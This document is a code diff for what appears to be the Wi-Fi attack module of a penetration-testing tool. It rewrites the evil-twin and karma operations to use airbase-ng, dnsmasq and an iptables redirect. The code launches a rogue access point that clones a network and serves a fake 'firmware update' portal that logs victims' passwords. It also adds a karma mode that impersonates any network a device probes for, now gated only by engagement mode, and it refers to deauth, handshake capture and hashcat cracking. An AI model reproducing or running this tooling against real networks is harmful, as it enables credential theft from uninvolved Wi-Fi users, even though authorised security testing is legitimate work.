@@ -21,18 +21,24 @@ Operations implemented in this module:
   POST /api/wifi_offensive/pmkid       hcxdumptool -> hcxpcapngtool -> .hc22000
   POST /api/wifi_offensive/handshake   deauth + EAPOL capture -> handshakes/
   POST /api/wifi_offensive/crack       hashcat vs a captured .hc22000 + wordlists/
-  POST /api/wifi_offensive/evil_twin   hostapd-mana rogue AP cloning an in-scope
-                                       SSID + dnsmasq + "firmware update" captive
-                                       portal (creds -> engagements/<uuid>/)
-  POST /api/wifi_offensive/karma       hostapd-mana respond-to-all-probes (MANA)
+  POST /api/wifi_offensive/evil_twin   airbase-ng rogue AP cloning an in-scope
+                                       SSID + dnsmasq (on the at0 tap) + iptables
+                                       redirect + "firmware update" captive portal
+                                       (creds -> engagements/<uuid>/)
+  POST /api/wifi_offensive/karma       airbase-ng -P respond-to-all-probes (MANA)
 
-Rogue-AP ops drive ``wlan1`` in AP/master mode (NOT monitor): the engagement
-gate is enforced exactly as for the injection ops, but ``_submit_gated`` is
-called with ``needs_monitor=False`` and the handler instead runs the module's
-``_restore_managed()`` teardown as a *prep* step so the card is in managed mode
-(and correctly named ``wlan1``) before hostapd-mana takes it over. The launch
-script restores managed mode on exit via a trap, and module shutdown / the
-engagement kill switch restore it as well.
+Rogue-AP ops drive ``wlan1`` through monitor mode (``mon0``) just like the
+injection ops: ``_submit_gated`` flips the radio to monitor via the MT7921
+helper, then ``airbase-ng`` consumes ``mon0`` and exposes an ``at0`` tap on which
+dnsmasq + the captive portal run. The launch script's trap kills the AP stack,
+flushes the iptables redirect, and restores ``wlan1`` to managed on any exit;
+module shutdown / the engagement kill switch restore it as well.
+
+Gate split: ``evil_twin`` has a single target SSID, so it keeps the full scope
+gate (``target=<ssid>``). ``karma`` is promiscuous by design (it becomes ANY
+SSID a client probes for) so there is no single target — it gates on
+engagement-mode-active ONLY (``target=""`` -> refuse when OFF, audit every
+start) and never bypasses the engagement gate.
 
 Deferred (clear TODO stubs, return HTTP 501): WPS (reaver/bully),
 WPA-Enterprise harvester (eaphammer).
@@ -68,15 +74,20 @@ AIRODUMP = shutil.which("airodump-ng") or "/usr/sbin/airodump-ng"
 HCXDUMPTOOL = shutil.which("hcxdumptool") or "/usr/bin/hcxdumptool"
 HCXPCAPNGTOOL = shutil.which("hcxpcapngtool") or "/usr/bin/hcxpcapngtool"
 HASHCAT = shutil.which("hashcat") or "/usr/bin/hashcat"
-# Rogue-AP stack (gated evil-twin / karma). hostapd-mana is the sensepost MANA
-# fork of hostapd; dnsmasq provides DHCP + the captive-portal DNS catch-all.
-HOSTAPD_MANA = shutil.which("hostapd-mana") or "/usr/bin/hostapd-mana"
+# Rogue-AP stack (gated evil-twin / karma). airbase-ng (aircrack-ng) drives the
+# monitor iface and exposes a tap; dnsmasq serves DHCP + the captive-portal DNS
+# catch-all on that tap. (hostapd-mana was the original plan but is not cleanly
+# installable on Debian trixie — needs libnl-3 >= 3.11 vs 3.7.0 in base, and the
+# apt pin correctly blocks pulling Kali's newer libnl. airbase-ng needs no new
+# deps.)
+AIRBASE = shutil.which("airbase-ng") or "/usr/sbin/airbase-ng"
 DNSMASQ = shutil.which("dnsmasq") or "/usr/sbin/dnsmasq"
 
 MT_HELPER = shutil.which("wlan-mt7921") or "/usr/local/bin/wlan-mt7921"
 WLAN_IFACE = "wlan1"  # managed-mode name of the MT7921 attack dongle
-MON_IFACE = "mon0"    # monitor-mode name exposed by the helper
-AP_GATEWAY = "10.0.0.1"  # captive-portal gateway IP assigned to wlan1 in AP mode
+MON_IFACE = "mon0"    # monitor-mode name exposed by the helper (airbase-ng input)
+AP_TAP = "at0"        # tap interface airbase-ng creates for the rogue AP
+AP_GATEWAY = "10.0.0.1"  # captive-portal gateway IP assigned to the at0 tap
 
 # hashcat mode for combined WPA*-PBKDF2 PMKID + EAPOL (.hc22000 hashline format).
 HC22000_MODE = "22000"
@@ -107,7 +118,7 @@ def _wordlists_dir() -> Path:
 
 
 def _ap_dir() -> Path:
-    """Scratch dir for rogue-AP runtime assets (hostapd/dnsmasq conf, portal)."""
+    """Scratch dir for rogue-AP runtime assets (dnsmasq conf + captive portal)."""
     return _dir("captures", "wifi", "ap")
 
 
@@ -124,9 +135,9 @@ def _norm_mac(value: str, field: str = "bssid") -> str:
 def _norm_ssid(value: str) -> str:
     """Validate an 802.11 SSID for use as a rogue-AP target.
 
-    The SSID is the engagement-scope target for AP ops AND is interpolated into
-    the generated hostapd config; reject control characters (a newline would let
-    a caller inject extra hostapd directives) and enforce the 1..32 byte limit.
+    The SSID is the engagement-scope target for evil-twin AND flows into the
+    airbase-ng argv (shlex-quoted); reject control characters and enforce the
+    1..32 byte 802.11 limit as defense in depth on top of the quoting.
     """
     v = (value or "").strip()
     if not v:
@@ -146,8 +157,8 @@ def _ssid_slug(ssid: str) -> str:
 def _ap_tools_missing() -> list[str]:
     """Return the rogue-AP tools that are not installed (empty == all present)."""
     missing: list[str] = []
-    if not (shutil.which("hostapd-mana") or Path(HOSTAPD_MANA).exists()):
-        missing.append("hostapd-mana")
+    if not (shutil.which("airbase-ng") or Path(AIRBASE).exists()):
+        missing.append("airbase-ng")
     if not (shutil.which("dnsmasq") or Path(DNSMASQ).exists()):
         missing.append("dnsmasq")
     return missing
@@ -385,40 +396,36 @@ def _crack_command(
 
 
 # --------------------------------------------------------------------------- #
-# Rogue-AP builders (evil-twin / karma). Configs are written to disk (never
-# shelled), so the SSID is validated against control chars by _norm_ssid; the
-# launch script only ever interpolates shlex-quoted file paths + ints.
+# Rogue-AP builders (evil-twin / karma). The dnsmasq config is written to disk
+# (never shelled); the SSID flows into the airbase-ng argv but is validated
+# against control chars by _norm_ssid AND shlex-quoted, so it can never break
+# out of the launch script.
 # --------------------------------------------------------------------------- #
-def _hostapd_mana_conf(
-    *, ssid: str, channel: int = 1, iface: str = WLAN_IFACE, karma: bool = False,
-) -> str:
-    """hostapd-mana config for an open rogue AP.
+def _airbase_args(
+    *, ssid: str | None, channel: int = 1, karma: bool = False, iface: str = MON_IFACE,
+) -> list[str]:
+    """Build the airbase-ng invocation (no sudo prefix; added by the launcher).
 
-    karma=True enables MANA loud mode: the AP answers directed probe requests
-    for *any* SSID, not just ``ssid``. The engagement gate only scopes the
-    declared base ``ssid``; responding beyond it is operator responsibility
-    (see the spec's "Scope discipline" note).
+    evil-twin: ``airbase-ng -e <ssid> -c <chan> <mon>`` clones one SSID.
+    karma:     ``airbase-ng -P -C 30 -c <chan> <mon>`` — ``-P`` answers ALL probe
+    requests (becomes any SSID a client asks for), ``-C 30`` beacons the probed
+    SSIDs every 30s. karma has no single target SSID by design; responding
+    broadly is gated only by engagement mode (operator responsibility — see the
+    spec's "Scope discipline" note).
     """
-    lines = [
-        f"interface={iface}",
-        "driver=nl80211",
-        f"ssid={ssid}",
-        "hw_mode=g",
-        f"channel={int(channel)}",
-        "auth_algs=1",       # open network — the captive portal does the rest
-        "ignore_broadcast_ssid=0",
-    ]
+    argv = [AIRBASE]
     if karma:
-        lines += [
-            "enable_mana=1",   # MANA probe-response engine on
-            "mana_loud=1",     # respond to directed probes for unseen SSIDs too
-            "mana_macacl=0",
-        ]
-    return "\n".join(lines) + "\n"
+        argv += ["-P", "-C", "30"]
+    if ssid:
+        argv += ["-e", ssid]
+    if channel:
+        argv += ["-c", str(int(channel))]
+    argv.append(iface)
+    return argv
 
 
 def _dnsmasq_conf(
-    *, iface: str = WLAN_IFACE, gateway: str = AP_GATEWAY, portal: bool = True,
+    *, iface: str = AP_TAP, gateway: str = AP_GATEWAY, portal: bool = True,
 ) -> str:
     """dnsmasq config: DHCP for AP clients + (for evil-twin) a DNS catch-all
     that points every lookup at the captive portal."""
@@ -511,61 +518,84 @@ if __name__ == "__main__":
 
 
 def _rogue_ap_command(
-    *, hostapd_conf: Path, dnsmasq_conf: Path, portal_py: Path | None,
-    duration: int = 900, iface: str = WLAN_IFACE, gateway: str = AP_GATEWAY,
+    *, airbase_argv: list[str], dnsmasq_conf: Path, portal_py: Path | None,
+    duration: int = 900, tap: str = AP_TAP, gateway: str = AP_GATEWAY,
 ) -> list[str]:
     """Build the full rogue-AP lifecycle as a single ``bash -c`` job.
 
-    Start -> capture -> teardown all live in one script: a trap restores wlan1
-    to managed mode (and kills the AP stack) on ANY exit — timeout, kill, or the
-    engagement kill switch terminating the job. Tool-presence is re-checked
-    in-script so a tool vanishing between pre-flight and launch still fails
-    cleanly instead of half-starting the AP.
+    Start -> capture -> teardown all live in one script. airbase-ng consumes the
+    monitor iface (mon0) and creates the ``at0`` tap; dnsmasq + (for evil-twin)
+    the captive portal + an iptables :80 redirect run on that tap. A trap kills
+    the AP stack, deletes the iptables rule, and restores wlan1 to managed on ANY
+    exit — timeout, kill, or the engagement kill switch. Tool presence is
+    re-checked in-script so a tool vanishing between pre-flight and launch still
+    fails cleanly instead of half-starting the AP.
     """
     duration = max(30, int(duration))
     q = shlex.quote
-    hc, dc = q(str(hostapd_conf)), q(str(dnsmasq_conf))
-    hap, dns = q(HOSTAPD_MANA), q(DNSMASQ)
-    ifc, gw = q(iface), q(gateway)
+    air = " ".join(q(a) for a in airbase_argv)
+    air0 = q(airbase_argv[0])
+    dc = q(str(dnsmasq_conf))
+    dns = q(DNSMASQ)
+    tapq, gw = q(tap), q(gateway)
 
     portal_launch = ""
     portal_kill = ""
+    iptables_add = ""
+    iptables_del = ""
     if portal_py is not None:
         pp = q(str(portal_py))
         portal_launch = f"sudo -n python3 {pp} & PORTAL=$!\n"
         portal_kill = f"  sudo -n pkill -f {pp} 2>/dev/null\n"
+        redir = (
+            f"-t nat {{op}} PREROUTING -i {tapq} -p tcp --dport 80 "
+            f"-j DNAT --to-destination {gateway}:80"
+        )
+        iptables_add = f"sudo -n iptables {redir.format(op='-A')} 2>/dev/null\n"
+        iptables_del = f"  sudo -n iptables {redir.format(op='-D')} 2>/dev/null\n"
 
     script = (
         "set +e\n"
         # Fail cleanly if a required tool is not installed (defense in depth).
-        f"command -v {hap} >/dev/null 2>&1 || sudo -n test -x {hap} || "
-        f'{{ echo "hostapd-mana not installed"; exit 1; }}\n'
+        f"command -v {air0} >/dev/null 2>&1 || sudo -n test -x {air0} || "
+        f'{{ echo "airbase-ng not installed"; exit 1; }}\n'
         f"command -v {dns} >/dev/null 2>&1 || sudo -n test -x {dns} || "
         f'{{ echo "dnsmasq not installed"; exit 1; }}\n'
-        # Teardown trap: kill the AP stack + restore wlan1 to managed on ANY exit.
+        # Teardown trap: kill the AP stack, drop the redirect, restore wlan1.
         "cleanup() {\n"
         "  trap - EXIT INT TERM\n"
-        f"  sudo -n pkill -f {hc} 2>/dev/null\n"
+        "  sudo -n kill $ABID 2>/dev/null\n"
         f"  sudo -n pkill -f {dc} 2>/dev/null\n"
         f"{portal_kill}"
-        f"  sudo -n ip addr flush dev {ifc} 2>/dev/null\n"
-        f"  sudo -n iw dev {ifc} set type managed 2>/dev/null\n"
-        f"  sudo -n ip link set {ifc} up 2>/dev/null\n"
+        f"{iptables_del}"
+        f"  sudo -n ip addr flush dev {tapq} 2>/dev/null\n"
+        # Restore the MT7921 to managed mode under its canonical name wlan1
+        # (mirrors _restore_managed_by_name so a timeout-ended job self-heals).
+        "  if [ -e /sys/class/net/mon0 ]; then\n"
+        "    sudo -n ip link set mon0 down 2>/dev/null\n"
+        "    sudo -n iw dev mon0 set type managed 2>/dev/null\n"
+        "    sudo -n ip link set mon0 name wlan1 2>/dev/null\n"
+        "    sudo -n ip link set wlan1 up 2>/dev/null\n"
+        "  else\n"
+        "    sudo -n iw dev wlan1 set type managed 2>/dev/null\n"
+        "  fi\n"
         "}\n"
         "trap cleanup EXIT INT TERM\n"
-        # 1. bring up the rogue AP (hostapd-mana puts wlan1 into AP/master mode).
-        f"sudo -n {hap} {hc} & HAPID=$!\n"
-        # 2. give the AP a beat, then assign the captive-portal gateway IP.
-        "sleep 4\n"
-        f"sudo -n ip addr add {gw}/24 dev {ifc} 2>/dev/null\n"
-        f"sudo -n ip link set {ifc} up 2>/dev/null\n"
-        # 3. DHCP + DNS catch-all for associated clients.
+        # 1. start airbase-ng on the monitor iface -> it creates the at0 tap.
+        f"sudo -n {air} & ABID=$!\n"
+        # 2. wait (up to ~15s) for the tap to appear.
+        f"for _ in $(seq 1 15); do [ -e /sys/class/net/{tap} ] && break; sleep 1; done\n"
+        # 3. bring the tap up with the captive-portal gateway IP.
+        f"sudo -n ip addr add {gw}/24 dev {tapq} 2>/dev/null\n"
+        f"sudo -n ip link set {tapq} up 2>/dev/null\n"
+        # 4. DHCP + DNS catch-all for associated clients.
         f"sudo -n {dns} -C {dc} -d & DNSID=$!\n"
-        # 4. captive portal (evil-twin only; karma passes portal_py=None).
+        # 5. iptables :80 redirect + captive portal (evil-twin only).
+        f"{iptables_add}"
         f"{portal_launch}"
-        # 5. run for the capture window, then let the trap restore managed mode.
-        f"( sleep {duration}; sudo -n kill $HAPID 2>/dev/null ) &\n"
-        "wait $HAPID\n"
+        # 6. run for the capture window, then let the trap restore managed mode.
+        f"( sleep {duration}; sudo -n kill $ABID 2>/dev/null ) &\n"
+        "wait $ABID\n"
     )
     return ["bash", "-c", script]
 
@@ -661,56 +691,58 @@ class EvilTwinBody(BaseModel):
 
 
 class KarmaBody(BaseModel):
-    ssid: str = Field(..., description="Base/advertised SSID; the in-scope gated target")
+    # karma has NO target SSID — it answers all probes. It is gated on
+    # engagement-mode-active only (see _launch_rogue_ap / the module docstring).
     channel: int = Field(default=1, ge=1, le=196, description="AP channel")
     duration: int = Field(default=900, ge=30, le=86_400, description="AP lifetime seconds")
 
 
 # --------------------------------------------------------------------------- #
 # Rogue-AP launch path (shared by evil-twin + karma). Goes through the exact
-# same engagement gate as every other op via _submit_gated.
+# same engagement gate as every other op via _submit_gated:
+#   - evil_twin: target=<ssid>  -> full scope-allowlist check + audit.
+#   - karma:     target=""      -> engagement-active check + audit only (no
+#     per-target scope check; karma is promiscuous by design). An empty target
+#     means runner.submit still refuses when engagement is OFF (recording a
+#     scope.violation) but skips the allowlist match.
 # --------------------------------------------------------------------------- #
 async def _launch_rogue_ap(
-    *, op: str, type_: str, ssid: str, channel: int, duration: int,
-    karma: bool, portal: bool,
+    *, op: str, type_: str, ssid: str | None, target: str, channel: int,
+    duration: int, karma: bool, portal: bool,
 ) -> dict[str, Any]:
     stamp = datetime.utcnow().strftime("%Y%m%d-%H%M%S")
-    slug = _ssid_slug(ssid)
+    slug = _ssid_slug(ssid) if ssid else "all-probes"
     apdir = _ap_dir()
-    hostapd_conf = apdir / f"{op}-{slug}-{stamp}.hostapd.conf"
     dnsmasq_conf = apdir / f"{op}-{slug}-{stamp}.dnsmasq.conf"
     portal_py = apdir / f"{op}-{slug}-{stamp}.portal.py" if portal else None
     eid = engagement.engagement_id or "unengaged"
     creds_log = get_settings().engagement_dir() / eid / f"creds-{slug}-{stamp}.log"
 
-    # Only touch the radio / materialise assets for an op the gate would allow,
-    # so a doomed (engagement-off / out-of-scope) request never starts an AP.
-    if _would_allow(ssid):
+    # Only materialise assets for an op the gate would allow, so a doomed
+    # (engagement-off / out-of-scope) request never writes config or starts an AP.
+    # _submit_gated flips the radio to monitor on the same condition.
+    if _would_allow(target):
         missing = _ap_tools_missing()
         if missing:
             raise HTTPException(503, f"required AP tool(s) not installed: {', '.join(missing)}")
-        # Prep with the module's existing teardown so wlan1 is in managed mode
-        # (and not stranded as mon0) before hostapd-mana takes it over.
-        await _restore_managed()
-        hostapd_conf.write_text(_hostapd_mana_conf(ssid=ssid, channel=channel, karma=karma))
         dnsmasq_conf.write_text(_dnsmasq_conf(portal=portal))
         if portal and portal_py is not None:
             creds_log.parent.mkdir(parents=True, exist_ok=True)
-            portal_py.write_text(_portal_script(creds_log=creds_log, ssid=ssid))
+            portal_py.write_text(_portal_script(creds_log=creds_log, ssid=ssid or ""))
 
+    airbase_argv = _airbase_args(ssid=ssid, channel=channel, karma=karma)
     argv = _rogue_ap_command(
-        hostapd_conf=hostapd_conf, dnsmasq_conf=dnsmasq_conf,
+        airbase_argv=airbase_argv, dnsmasq_conf=dnsmasq_conf,
         portal_py=portal_py, duration=duration,
     )
-    mode = "karma/MANA" if karma else "evil-twin"
-    job_id = await _submit_gated(
-        type_, argv, target=ssid,
-        note=f"{mode} ssid={ssid!r} ch={channel} dur={duration}s portal={portal}",
-        needs_monitor=False,  # AP mode — never flip wlan1 to monitor
-    )
+    if karma:
+        note = f"karma/MANA (all-probes) ch={channel} dur={duration}s portal={portal}"
+    else:
+        note = f"evil-twin ssid={ssid!r} ch={channel} dur={duration}s portal={portal}"
+    # needs_monitor defaults True: airbase-ng requires the mon0 monitor iface.
+    job_id = await _submit_gated(type_, argv, target=target, note=note)
     out: dict[str, Any] = {
-        "ok": True, "op": op, "job_id": job_id, "target": ssid,
-        "hostapd_conf": hostapd_conf.as_posix(),
+        "ok": True, "op": op, "job_id": job_id, "target": target,
         "dnsmasq_conf": dnsmasq_conf.as_posix(),
         "argv": argv,
     }
@@ -858,22 +890,22 @@ class Module(ModuleBase):
                 "outfile": outfile.as_posix(), "argv": argv,
             }
 
-        # ----- Op 5: evil twin + captive portal ---------------------------- #
+        # ----- Op 5: evil twin + captive portal (airbase-ng) --------------- #
         @r.post("/evil_twin")
         async def evil_twin(body: EvilTwinBody) -> dict[str, Any]:
             ssid = _norm_ssid(body.ssid)
             return await _launch_rogue_ap(
-                op="evil_twin", type_="wifi.evil_twin", ssid=ssid,
+                op="evil_twin", type_="wifi.evil_twin", ssid=ssid, target=ssid,
                 channel=body.channel, duration=body.duration,
                 karma=False, portal=True,
             )
 
-        # ----- Op 6: karma / MANA ------------------------------------------ #
+        # ----- Op 6: karma / MANA (airbase-ng -P) -------------------------- #
+        # Promiscuous (no target SSID) -> gated on engagement-active only.
         @r.post("/karma")
         async def karma(body: KarmaBody) -> dict[str, Any]:
-            ssid = _norm_ssid(body.ssid)
             return await _launch_rogue_ap(
-                op="karma", type_="wifi.karma", ssid=ssid,
+                op="karma", type_="wifi.karma", ssid=None, target="",
                 channel=body.channel, duration=body.duration,
                 karma=True, portal=False,
             )
